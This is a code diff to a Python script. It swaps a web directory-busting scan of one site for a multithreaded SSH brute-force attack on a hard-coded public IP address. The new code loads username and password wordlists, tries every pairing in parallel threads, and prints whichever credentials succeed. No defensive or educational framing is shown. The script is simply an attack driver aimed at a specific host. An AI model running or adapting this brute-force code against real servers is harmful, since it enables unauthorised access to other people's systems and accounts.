@@ -1,25 +1,27 @@
-from src.boganBuster import busterChecker, threading
-from src.DataClasses import boganBusterData
+from src.sshBrute import SSH, Brute, threading
+from src.DataClasses import sshBruteData
 
-data = boganBusterData(target='https://www.bogan.cool/', proxy_type='http')
+import time
+
+data = sshBruteData(target="192.46.232.67", thr=10, timeout=0.1, wordlist_usernames_path='a.txt', wordlist_passwords_path='b.txt')
 
 
-l = [i for i in range(1000)]
-l[50] = 'mighty-manager'
-data.wordlist = l
-data.thr = 30
+SSH(data).load_wordlist_usernames()
+SSH(data).load_wordlist_passwords()
 
 threads = []
-for dir_ in l:
-	while True:
-		if threading.active_count() < data.thr:
-			i = busterChecker(False, dir_, data)
-			i.start()
-			threads.append(i)
-			break
+for user in data.wordlist_usernames:
+	for password in data.wordlist_passwords:
+		while True:
+			if threading.active_count() < data.thr:
+				i = Brute(data, user, password)
+				i.start()
+				threads.append(i)
+				time.sleep(data.timeout)
+				break
 
 for t in threads:
 	t.join()
 
 
-print(data.good_dirs)
+print(data.goods)
